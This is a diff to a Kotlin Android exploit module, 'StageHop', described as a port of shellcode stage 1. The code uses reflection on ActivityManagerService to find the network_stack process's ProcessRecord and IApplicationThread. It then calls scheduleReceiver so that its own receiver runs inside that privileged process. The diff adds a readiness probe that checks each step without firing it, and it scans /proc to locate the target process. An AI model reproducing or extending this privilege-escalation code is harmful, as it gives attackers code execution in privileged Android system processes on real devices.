@@ -6,6 +6,8 @@ import android.content.pm.ActivityInfo
 import android.os.Process
 import android.util.ArrayMap
 import android.util.Log
+import java.io.File
+import java.lang.reflect.Method
 
 /**
  * system_server -> network_stack hop, ported from LSPromise Shellcode.stage1
@@ -28,6 +30,53 @@ object StageHop {
     const val NETWORK_STACK_PROCESS = "com.android.networkstack.process"
     const val NETWORK_STACK_UID = 1073
 
+    data class Readiness(
+        val networkStackProc: String,
+        val amsProcessRecord: String,
+        val applicationThread: String,
+        val scheduleReceiver12: String,
+        val state: String,
+        val detail: String,
+    )
+
+    /**
+     * Read-only view of the exact launch environment [hopToNetworkStack] needs.
+     * It resolves the same AMS ProcessRecord, IApplicationThread and
+     * scheduleReceiver/12 method, but never constructs a receiver or invokes it.
+     */
+    fun probeReadiness(context: Context): Readiness {
+        val log = StringBuilder()
+        val proc = networkStackProcVisible()
+        var processRecord = "UNKNOWN"
+        var appThread = "UNKNOWN"
+        var scheduleReceiver = "UNKNOWN"
+        try {
+            val (ams, amsClass) = activityManagerService(log)
+            val pr = findProcessRecord(ams, amsClass, log)
+            processRecord = if (pr == null) "FAIL" else "PASS"
+            if (pr != null) {
+                val thread = findAppThread(pr, log)
+                appThread = if (thread == null) "FAIL" else "PASS"
+                if (thread != null) {
+                    scheduleReceiver =
+                        if (resolveScheduleReceiver12(thread) == null) "FAIL" else "PASS"
+                }
+            }
+        } catch (t: Throwable) {
+            log.appendLine("[!] readiness probe failed: $t")
+        }
+        val state = when {
+            proc == "PASS" && processRecord == "PASS" && appThread == "PASS" &&
+                scheduleReceiver == "PASS" -> "NETWORKSTACK_READY"
+            proc == "FAIL" || processRecord == "FAIL" -> "NETWORKSTACK_NOT_READY"
+            else -> "NETWORKSTACK_PARTIAL"
+        }
+        return Readiness(
+            proc, processRecord, appThread, scheduleReceiver, state,
+            log.toString().replace('\n', ' ').trim().ifEmpty { "UNKNOWN" }
+        )
+    }
+
     /** Steal network_stack's IApplicationThread and bounce our StageReceiver there. */
     fun hopToNetworkStack(context: Context): String {
         val log = StringBuilder()
@@ -41,13 +90,8 @@ object StageHop {
             }
             val intent = Intent().setClassName(appInfo.packageName, receiverInfo.name)
 
-            val smClass = Class.forName("android.os.ServiceManager")
-            val ams = smClass.getMethod("getService", String::class.java)
-                .invoke(null, Context.ACTIVITY_SERVICE)
-                ?: throw RuntimeException("ActivityService handle is null")
+            val (ams, amsClass) = activityManagerService(log)
             log.appendLine("[*] got ActivityManagerService")
-            val amsClass = ams.javaClass.classLoader!!
-                .loadClass("com.android.server.am.ActivityManagerService")
             Diagnostics.dumpAmsShape(ams, amsClass, log)  // Gate C.1
             // ProcessRecord lookup, tolerant to per-build signature drift
             // (e.g. getProcessRecordLocked(String,int) vs (String,int,boolean)).
@@ -61,8 +105,7 @@ object StageHop {
             Diagnostics.dumpAppThreadShape(thread, log)  // Gate C.3
             // scheduleReceiver(Intent, ActivityInfo, CompatibilityInfo, int, String,
             //   Bundle, boolean, boolean, int, int, int, String) — 12 params.
-            val m = thread.javaClass.methods
-                .firstOrNull { it.name == "scheduleReceiver" && it.parameterCount == 12 }
+            val m = resolveScheduleReceiver12(thread)
                 ?: throw RuntimeException("scheduleReceiver/12 not found")
             m.invoke(
                 thread, intent, receiverInfo, null, 0, null, null,
@@ -79,6 +122,42 @@ object StageHop {
             Log.i(TAG, line)
         }
         return log.toString()
+    }
+
+    private fun activityManagerService(log: StringBuilder): Pair<Any, Class<*>> {
+        val smClass = Class.forName("android.os.ServiceManager")
+        val ams = smClass.getMethod("getService", String::class.java)
+            .invoke(null, Context.ACTIVITY_SERVICE)
+            ?: throw RuntimeException("ActivityService handle is null")
+        val amsClass = ams.javaClass.classLoader!!
+            .loadClass("com.android.server.am.ActivityManagerService")
+        log.appendLine("[*] ActivityManagerService resolved")
+        return Pair(ams, amsClass)
+    }
+
+    private fun resolveScheduleReceiver12(thread: Any): Method? =
+        thread.javaClass.methods.firstOrNull {
+            it.name == "scheduleReceiver" && it.parameterCount == 12
+        }
+
+    private fun networkStackProcVisible(): String {
+        val entries = try {
+            File("/proc").list()
+        } catch (_: Throwable) {
+            null
+        } ?: return "UNKNOWN"
+        var readable = 0
+        for (name in entries) {
+            if (name.toIntOrNull() == null) continue
+            val cmdline = try {
+                File("/proc/$name/cmdline").readText().trim().trim('\u0000')
+            } catch (_: Throwable) {
+                continue
+            }
+            readable++
+            if (cmdline == NETWORK_STACK_PROCESS) return "PASS"
+        }
+        return if (readable == 0) "UNKNOWN" else "FAIL"
     }
 
     /**
